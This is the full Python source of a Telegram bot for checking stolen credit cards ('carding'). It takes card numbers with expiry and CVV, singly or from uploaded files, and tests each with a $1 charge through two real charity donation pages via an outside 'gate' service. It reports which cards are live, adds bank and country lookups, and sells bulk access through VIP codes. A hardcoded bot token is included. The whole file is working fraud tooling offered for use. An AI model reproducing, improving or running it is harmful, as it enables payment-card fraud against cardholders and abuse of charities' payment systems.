import os
import re
import time
import random
import asyncio
import httpx
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'

# ------------------- Users -------------------
ADMINS = [6843321125]
VIP_USERS = {}
stop_users = {}

# 🔥 Anti-Spam + VIP
last_check_time = {}
ANTI_SPAM_SECONDS = 7

# ------------------- Gates -------------------
GATES = [
    "https://raybensch.com/donations/support-ray/",
    "https://www.wfft.org/donations/general-donation/"
]
gate_index = 0
api_semaphore = asyncio.Semaphore(6)

# ------------------- Codes -------------------
CODES = {}

# ------------------- Load / Save -------------------
def save_vip():
    with open("vip.json", "w") as f:
        json.dump(VIP_USERS, f)

def load_vip():
    global VIP_USERS
    try:
        with open("vip.json", "r") as f:
            VIP_USERS = json.load(f)
    except:
        VIP_USERS = {}

def save_codes():
    with open("codes.json", "w") as f:
        json.dump(CODES, f)

def load_codes():
    global CODES
    try:
        with open("codes.json", "r") as f:
            CODES = json.load(f)
    except:
        CODES = {}

def is_vip(user_id):
    if user_id in VIP_USERS:
        if time.time() < VIP_USERS[user_id]:
            return True
        else:
            VIP_USERS.pop(user_id, None)
            save_vip()
    return False

# ------------------- BIN Lookup -------------------
async def get_bin_info(bin_number):
    urls = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for attempt in range(3):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                    if r.status_code != 200:
                        continue
                    data = r.json()
                    brand = data.get("scheme") or data.get("brand") or data.get("type")
                    card_type = data.get("type") or data.get("card_type")
                    bank = (
                        data.get("bank", {}).get("name")
                        if isinstance(data.get("bank"), dict)
                        else data.get("bank")
                    )
                    country = (
                        data.get("country", {}).get("name")
                        if isinstance(data.get("country"), dict)
                        else data.get("country")
                    )
                    if not bank:
                        bank = data.get("issuer") or data.get("bank_name")
                    if not country:
                        country = data.get("country_name")
                    if brand or bank or country:
                        return (
                            f"{brand or 'Unknown'} - {card_type or 'Unknown'}",
                            bank or "Unknown",
                            country or "Unknown"
                        )
            except:
                continue
        await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- Check API -------------------
async def check_card_api(card_full):
    global gate_index
    gate = GATES[gate_index]
    gate_index = (gate_index + 1) % len(GATES)
    params = {
        "url": gate,
        "card": card_full,
        "amount": 1.00
    }
    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=20) as client:
                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
            result_raw = r.json().get('result', '')
            result = result_raw.lower()
            if "charge" in result or "success" in result:
                return "approved", result_raw
            elif "insufficient" in result:
                return "live", result_raw
            else:
                return "declined", result_raw
        except:
            return "declined", "Error"

# ------------------- Format Response -------------------
async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)
    if status == "approved":
        title = "#Charge ✅"
    elif status == "live":
        title = "#Live 🟢"
    else:
        title = "#Declined ❌"
    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- Permissions -------------------
def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True
    elif is_vip(user_id):
        return True
    else:
        return mode == "single"

# ------------------- /pp -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not can_user_check(user_id, mode="single"):
        await update.message.reply_text("❌ Not allowed")
        return

    # Anti-Spam
    if user_id not in ADMINS:
        last = last_check_time.get(user_id, 0)
        if time.time() - last < ANTI_SPAM_SECONDS:
            wait = round(ANTI_SPAM_SECONDS - (time.time() - last), 1)
            await update.message.reply_text(f"⏳ Wait {wait}s")
            return
        last_check_time[user_id] = time.time()

    asyncio.create_task(process_pp(update, context))

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242|09|28|123")
        return
    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)
    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not (user_id in ADMINS or is_vip(user_id)):
        await update.message.reply_text("❌ VIP only for file check.")
        return

    asyncio.create_task(process_file(update, context))

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    file = await update.message.document.get_file()
    path = f"{file.file_id}.txt"
    await file.download_to_drive(path)

    with open(path) as f:
        for line in f:
            if stop_users.get(user_id):
                break
            card = line.strip()
            status, res = await check_card_api(card)
            if status != "declined":
                txt = await format_response(card, status, res, 0)
                await update.message.reply_text(txt)

# ------------------- Admin Panel -------------------
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return await update.message.reply_text("❌ Not admin")

    keyboard = [
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
        [InlineKeyboardButton("➕ Add VIP", callback_data="add")],
        [InlineKeyboardButton("➖ Remove VIP", callback_data="rem")],
        [InlineKeyboardButton("🎟 Create Code", callback_data="create_code")],
        [InlineKeyboardButton("📋 Show Codes", callback_data="show_codes")]
    ]
    await update.message.reply_text("🔥 Admin Panel", reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return

    data = query.data
    if data.startswith("ban_"):
        uid = int(data.split("_")[1])
        VIP_USERS.pop(uid, None)
        save_vip()
        await query.edit_message_text(f"User banned: {uid}")

    elif data.startswith("unban_"):
        uid = int(data.split("_")[1])
        VIP_USERS[uid] = int(time.time()) + 7*24*3600
        save_vip()
        await query.edit_message_text(f"User unbanned: {uid}")

    elif data == "stats":
        await query.edit_message_text(f"VIP Users: {len(VIP_USERS)}")

    elif data == "create_code":
        code = f"VIP{random.randint(1000,9999)}"
        CODES[code] = {"duration": 7, "max_users": 5, "used": 0}
        save_codes()
        await query.edit_message_text(f"✅ Code created:\n{code}")

    elif data == "show_codes":
        text = "📋 Codes:\n\n"
        for c, d in CODES.items():
            text += f"{c} | {d['used']}/{d['max_users']}\n"
        await query.edit_message_text(text)

async def admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return

    mode = context.user_data.get("mode")
    if not mode:
        return

    try:
        uid = int(update.message.text)
    except:
        await update.message.reply_text("Invalid ID")
        return

    if mode == "add":
        VIP_USERS[uid] = int(time.time()) + 7*24*3600
        save_vip()
        await update.message.reply_text("✅ VIP Added")
    elif mode == "rem":
        VIP_USERS.pop(uid, None)
        save_vip()
        await update.message.reply_text("❌ VIP Removed")

    context.user_data["mode"] = None

# ------------------- Redeem Code -------------------
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem CODE")
        return
    code = context.args[0]
    if code not in CODES:
        await update.message.reply_text("❌ Invalid code")
        return
    data = CODES[code]
    if data["used"] >= data["max_users"]:
        await update.message.reply_text("❌ Code expired")
        return
    VIP_USERS[user_id] = int(time.time()) + data["duration"] * 86400
    data["used"] += 1
    save_vip()
    save_codes()
    await update.message.reply_text("✅ VIP Activated 🎉")

# ------------------- Run -------------------
def main():
    load_vip()
    load_codes()
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", lambda u,c: u.message.reply_text("Bot Ready ✅")))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("admin_panel", admin_panel))
    app.add_handler(CommandHandler("redeem", redeem))

    app.add_handler(CallbackQueryHandler(admin_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, admin_input))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == "__main__":
    main()
